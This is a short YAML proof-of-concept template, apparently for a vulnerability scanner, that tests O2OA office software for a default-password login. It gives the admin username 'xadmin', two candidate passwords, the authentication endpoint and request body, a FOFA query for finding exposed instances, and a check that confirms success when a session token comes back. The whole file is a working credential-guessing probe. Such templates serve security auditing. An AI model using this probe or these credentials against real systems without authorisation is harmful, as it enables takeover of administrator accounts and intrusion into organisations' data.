id: poc-yaml-zoneland-o2oa-default-password-login
info:
  name: O2OA 默认密码登录
  severity: high
  tags:
  - 弱口令
  finger: o2oa
  fofa: title == "O2OA"
variables:
  pass: 'o2

    o2oa@2022

    '
requests:
- method: POST
  path: /x_organization_assemble_authentication/jaxrs/authentication/
  headers:
    X-Requested-With: XMLHttpRequest
    Content-Type: application/json; charset=UTF-8
  data: '{"credential":"xadmin","password":"{{.pass}}"}

    '
  expression: "status_code == 200 && \ncontains(body,\"\\\"type\\\": \\\"success\\\
    \"\") &&\ncontains(body,\"\\\"token\\\"\") &&\ncontains(body,\"\\\"id\\\"\") &&\n\
    contains(body,\"\\\"name\\\"\") &&\ncontains(headers,\"application/json\")\n"
transport: http
